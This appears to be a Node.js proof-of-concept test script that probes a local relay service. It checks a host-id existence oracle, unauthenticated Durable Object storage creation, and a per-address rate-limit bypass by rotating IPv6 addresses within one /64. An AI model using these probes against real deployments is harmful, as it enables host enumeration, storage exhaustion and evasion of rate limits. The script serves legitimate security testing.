#!/usr/bin/env node
// Attacker: external, no paired device, no host key.
// 1. Host-id oracle: /v1/resolve and /v1/connect tell an anonymous caller whether a host id is live.
// 2. Unauthenticated durable writes: /v1/resolve and /v1/host/challenge create a Durable Object
//    with tables for every id / key the caller invents (billable storage, never swept).
// Needs the relay started by lib/local-relay.mjs (reads its persisted state to count objects).
import { randomBytes } from 'node:crypto'
import { readdirSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { DatabaseSync } from 'node:sqlite'
import {
  hostOnline,
  openSocket,
  postJson,
  relayOrigin,
  relayState,
  report,
  sleep,
  wsOrigin,
  nacl,
  b64,
  setSourceIp,
  freshSourceIp
} from '../lib/relay-protocol.mjs'

const N = Number(process.env.N ?? 40)
const origin = relayOrigin()
const state = relayState()
const randomHostId = () => randomBytes(12).toString('base64url')

function objects(className) {
  const dir = join(state.persistDir, 'v3', 'do', `seal-relay-${className}`)
  let files = []
  try {
    files = readdirSync(dir).filter(
      (name) => name.endsWith('.sqlite') && name !== 'metadata.sqlite'
    )
  } catch {}
  let withTables = 0
  let bytes = 0
  let rows = 0
  for (const name of files) {
    const path = join(dir, name)
    bytes += statSync(path).size
    try {
      bytes += statSync(`${path}-wal`).size
    } catch {}
    try {
      const db = new DatabaseSync(path, { readOnly: true })
      // Miniflare keeps its own bookkeeping table in every local object; only the Worker's count.
      const tables = db
        .prepare("SELECT name FROM sqlite_master WHERE type = 'table'")
        .all()
        .map((r) => r.name)
        .filter((name) => !name.startsWith('_cf_') && !name.startsWith('__miniflare'))
      if (tables.length > 0) {
        withTables++
      }
      if (tables.includes('challenges')) {
        rows += db.prepare('SELECT count(*) AS n FROM challenges').get().n
      }
      db.close()
    } catch {}
  }
  return { objects: files.length, withTables, bytes, rows }
}

// ---- 1. oracle ----
setSourceIp(freshSourceIp())
const victim = await hostOnline(origin)
const known = await postJson(origin, '/v1/resolve', {
  v: 1,
  relayHostId: victim.keys.hostId,
  resumeToken: 'not-a-credential'
})
const unknown = await postJson(origin, '/v1/resolve', {
  v: 1,
  relayHostId: randomHostId(),
  resumeToken: 'not-a-credential'
})
report(
  '/v1/resolve answers without checking resumeToken',
  known.status === 200 && unknown.status === 404 ? 'VULNERABLE (oracle)' : 'blocked',
  {
    liveHost: { http: known.status, body: known.json },
    unknownHost: { http: unknown.status }
  }
)
async function phoneProbe(hostId) {
  const socket = openSocket(`${wsOrigin(origin)}/v1/connect/${hostId}`)
  await socket.open()
  socket.sendJson({
    type: 'relay-auth',
    v: 1,
    mode: 'connect',
    credential: randomBytes(32).toString('base64url')
  })
  const hello = await socket.nextJson(3000)
  await socket.waitClosed(3000)
  return hello?.code
}
const liveCode = await phoneProbe(victim.keys.hostId)
const deadCode = await phoneProbe(randomHostId())
report(
  '/v1/connect close code differs for live vs unknown host',
  liveCode !== deadCode ? 'VULNERABLE (oracle)' : 'blocked',
  { liveHost: liveCode, unknownHost: deadCode }
)

// ---- 2. unauthenticated storage ----
// One source address, so the per-address limit (30/min on resolve + challenge + session) shows.
setSourceIp(freshSourceIp())
await sleep(500)
const hostBefore = objects('SealHostRelay')
// Control: the phone path was built not to create storage for unknown hosts.
for (let i = 0; i < N; i++) {
  await phoneProbe(randomHostId())
}
await sleep(1500)
const hostAfterConnect = objects('SealHostRelay')
let resolveLimited = 0
for (let i = 0; i < N; i++) {
  const response = await postJson(origin, '/v1/resolve', {
    v: 1,
    relayHostId: randomHostId(),
    resumeToken: 'x'
  })
  if (response.status === 429) {
    resolveLimited++
  }
}
await sleep(1500)
const hostAfterResolve = objects('SealHostRelay')
report(
  `/v1/connect/<random id> x${N}: host objects with tables`,
  hostAfterConnect.withTables === hostBefore.withTables ? 'blocked' : 'VULNERABLE',
  {
    before: hostBefore.withTables,
    after: hostAfterConnect.withTables
  }
)
const created = hostAfterResolve.withTables - hostAfterConnect.withTables
report(
  `/v1/resolve <random id> x${N}: host objects with tables`,
  created > 0 ? 'VULNERABLE' : 'blocked',
  {
    created,
    rateLimited: resolveLimited,
    bytesAdded: hostAfterResolve.bytes - hostAfterConnect.bytes,
    bytesPerRequest:
      created > 0 ? Math.round((hostAfterResolve.bytes - hostAfterConnect.bytes) / created) : 0
  }
)

// The limiter keys on the whole address (index.ts admitHostAuth), not the /64 the shared edge
// uses for phones (preauth.ts sourceKey): one IPv6 subscriber has 2^64 keys.
let rotated = 0
for (let i = 0; i < N; i++) {
  setSourceIp(`2001:db8:5ea1:1::${(i + 1).toString(16)}`)
  const response = await postJson(origin, '/v1/resolve', {
    v: 1,
    relayHostId: randomHostId(),
    resumeToken: 'x'
  })
  if (response.status !== 429) {
    rotated++
  }
}
report(
  `/v1/resolve x${N} rotating inside one IPv6 /64 after the limit tripped`,
  rotated > 0 && resolveLimited > 0
    ? 'VULNERABLE (limit bypass)'
    : rotated > 0
      ? 'info (limit had not tripped; raise N above 30)'
      : 'blocked',
  { admitted: rotated }
)

setSourceIp(freshSourceIp())
const pushBefore = objects('SealPushHost')
let challengeLimited = 0
for (let i = 0; i < N; i++) {
  const response = await postJson(origin, '/v1/host/challenge', {
    v: 1,
    hostPublicKeyB64: b64(nacl.box.keyPair().publicKey)
  })
  if (response.status === 429) {
    challengeLimited++
  }
}
await sleep(1500)
const pushAfter = objects('SealPushHost')
report(
  `/v1/host/challenge <random key> x${N}: push objects with tables`,
  pushAfter.withTables > pushBefore.withTables ? 'VULNERABLE' : 'blocked',
  {
    created: pushAfter.withTables - pushBefore.withTables,
    rateLimited: challengeLimited,
    challengeRowsLeftBehind: pushAfter.rows - pushBefore.rows,
    bytesAdded: pushAfter.bytes - pushBefore.bytes
  }
)
victim.control.ws.terminate()
process.exit(0)
